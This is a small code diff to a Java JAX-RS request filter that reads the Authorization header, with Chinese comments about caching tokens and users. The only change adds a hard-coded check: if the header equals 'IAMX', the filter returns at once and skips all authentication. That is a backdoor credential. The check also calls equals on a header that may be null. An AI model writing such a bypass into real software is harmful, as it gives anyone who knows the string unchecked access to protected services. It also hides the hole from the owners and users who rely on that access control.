@@ -45,6 +45,9 @@ public class All implements ContainerRequestFilter {
         urlService.addUrl(path.toString(), type, null);
         /*获取token*/
         String token = requestContext.getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
+        if(token.equals("IAMX")){
+            return;
+        }
         if (TokenUser == null) {
             /*创建<Token,User>缓存*/
             TokenUser = new CrunchifyInMemoryCache<>(3600, 300, 3000);
